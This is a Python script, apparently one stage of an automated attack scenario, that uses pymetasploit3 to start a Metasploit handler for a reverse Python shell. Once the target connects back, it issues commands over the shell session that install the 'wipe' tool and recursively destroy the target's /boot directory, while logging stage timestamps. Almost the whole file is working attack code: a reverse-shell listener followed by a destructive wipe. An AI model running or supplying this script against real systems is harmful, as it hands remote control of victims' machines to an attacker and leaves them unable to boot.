import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 5:
        print("Usage: {} Folder local_ip target_ip duration flag_finish".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    flag_finish = argv[4]
    wipe_disk_folder = "/boot"

    client = MsfRpcClient('kali')

    exploit = client.modules.use('exploit', 'multi/handler')
    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
    payload['LHOST'] = my_ip

    time.sleep(2)
    output_time_file = 'time_stage_3_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)
    #print('Start 3')

    exploit.execute(payload=payload)

    while client.jobs.list:
        time.sleep(1)

    #print(client.sessions.list['4'])

    shell = client.sessions.session('4')
    shell.write('apt install wipe -y')
    shell.write("wipe -r -f {0}".format(wipe_disk_folder))

    print(flag_finish)


main(sys.argv)
